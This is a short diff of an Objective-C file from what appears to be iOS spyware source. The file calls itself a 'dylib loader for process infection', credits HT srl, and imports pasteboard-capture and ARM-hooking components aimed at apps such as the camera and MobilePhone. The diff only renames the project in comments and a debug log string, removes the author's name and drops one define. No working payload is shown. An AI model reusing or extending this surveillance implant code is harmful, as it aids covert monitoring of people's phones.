@@ -1,5 +1,5 @@
 /*
- * RCSIpony - dylib loader for process infection
+ * RCSiOS - dylib loader for process infection
  *  pon pon 
  *
  * [QUICK TODO]
@@ -13,7 +13,7 @@
  * - MobilePhone
  *
  *
- * Created by Alfredo 'revenge' Pesoli on 07/09/2009
+ * Created on 07/09/2009
  * Copyright (C) HT srl 2009. All rights reserved
  *
  */
@@ -36,8 +36,6 @@
 #import "RCSIAgentPasteboard.h"
 
 #import "ARMHooker.h"
-
-#define JSON_CONFIG
 
 #define CAMERA_APP    @"com.apple.camera"
 #define CAMERA_APP_40 @"com.apple.mobileslideshow"
@@ -144,7 +142,7 @@ void RILog (NSString *format, ...)
   
 #ifdef DEBUG
   mFD = fopen ("/private/var/mobile/RCSIphone/dylib.log", "a");
-  fprintf (mFD, "[RCSIPony] - %s\n", [string UTF8String]);
+  fprintf (mFD, "[RCSiOS] - %s\n", [string UTF8String]);
   fclose (mFD);
 #endif
   
